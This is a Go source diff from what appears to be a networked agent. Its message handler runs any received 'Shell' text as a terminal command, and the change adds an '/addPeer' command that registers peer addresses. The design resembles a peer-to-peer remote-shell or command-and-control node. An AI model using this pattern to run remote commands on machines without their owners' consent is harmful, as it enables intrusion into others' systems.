@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	"net/http"
+	"strings"
 
 	"github.com/golang-jwt/jwt"
 )
@@ -235,6 +236,13 @@ func interpretMessage(message Message) (Message, error) {
 
 	if content.Shell == "/os" {
 		replyContent.OsDetails = osDetails()
+
+	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
+		fmt.Println("added peer:" + content.Shell[9:])
+		entitiesPool = append(entitiesPool, Entity{
+			Address: content.Shell[9:],
+		})
+
 	} else {
 		replyContent.ShellOutput, err = runTerminal(content.Shell)
 		if err != nil {
